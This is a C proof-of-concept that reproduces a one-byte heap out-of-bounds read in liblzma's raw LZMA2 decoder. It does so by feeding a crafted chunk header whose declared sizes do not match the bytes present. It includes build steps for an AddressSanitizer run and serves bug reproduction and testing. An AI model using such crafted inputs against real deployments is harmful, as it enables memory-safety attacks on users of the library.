// SPDX-License-Identifier: 0BSD
//
// Residual memory-safety PoC for the LZMA2 chunk-size handling.
//
// It feeds a crafted raw LZMA2 stream to the public single-call raw decoder
// lzma_raw_buffer_decode(). The stream contains one LZMA chunk whose declared
// compressed size equals the number of compressed bytes actually present in
// the buffer (there is no following chunk and no end marker), while the
// declared uncompressed size is far larger than those bytes can produce. The
// inner LZMA decoder therefore runs out of input and tries to read one more
// byte. With the shipped tree that one extra byte lies one past the end of the
// input buffer, which AddressSanitizer reports as a heap-buffer-overflow read.
//
// Build (links the sanitizer-instrumented liblzma built under build-asan):
//   cc -I../src/liblzma/api -fsanitize=address -g -O0 residual.c \
//       ../build-asan/liblzma.a -o /tmp/residual
//   /tmp/residual

#include <lzma.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int
main(void)
{
	// Number of compressed payload bytes actually present in the buffer.
	// This is also what we declare as the chunk's compressed size, so the
	// available input ends exactly at the chunk boundary with no byte to
	// spare.
	const size_t payload = 11;

	// LZMA2 chunk header:
	//   control  = 0xE0: LZMA chunk, dictionary reset + new properties,
	//              high 5 bits of (uncompressed_size - 1) are 0.
	//   unc hi/lo: uncompressed_size - 1 = 0x0FFF -> uncompressed_size 4096.
	//   comp hi/lo: compressed_size - 1 = payload - 1 -> compressed_size =
	//              payload.
	//   props    = 0x5D: lc=3, lp=0, pb=2.
	const size_t header = 6;
	const size_t in_size = header + payload;

	// Allocate exactly in_size bytes so a read of in[in_size] is detected.
	uint8_t *in = malloc(in_size);
	if (in == NULL)
		return 99;

	in[0] = 0xE0;
	in[1] = 0x0F;
	in[2] = 0xFF;
	in[3] = (uint8_t)((payload - 1) >> 8);
	in[4] = (uint8_t)((payload - 1) & 0xFF);
	in[5] = 0x5D;

	// LZMA payload: first byte must be 0x00 for the range coder init; the
	// rest are literal-ish filler. Their exact values don't matter: there
	// simply aren't enough of them to produce 4096 output bytes, so the
	// decoder keeps asking for more input.
	in[6] = 0x00;
	for (size_t i = 7; i < in_size; ++i)
		in[i] = 0x00;

	lzma_options_lzma opt;
	if (lzma_lzma_preset(&opt, LZMA_PRESET_DEFAULT)) {
		free(in);
		return 99;
	}

	lzma_filter filters[2] = {
		{ .id = LZMA_FILTER_LZMA2, .options = &opt },
		{ .id = LZMA_VLI_UNKNOWN, .options = NULL },
	};

	uint8_t out[8192];
	size_t in_pos = 0;
	size_t out_pos = 0;

	lzma_ret ret = lzma_raw_buffer_decode(filters, NULL,
			in, &in_pos, in_size,
			out, &out_pos, sizeof(out));

	printf("lzma_raw_buffer_decode returned %d, in_pos=%zu, out_pos=%zu\n",
			(int)ret, in_pos, out_pos);

	free(in);
	return 0;
}
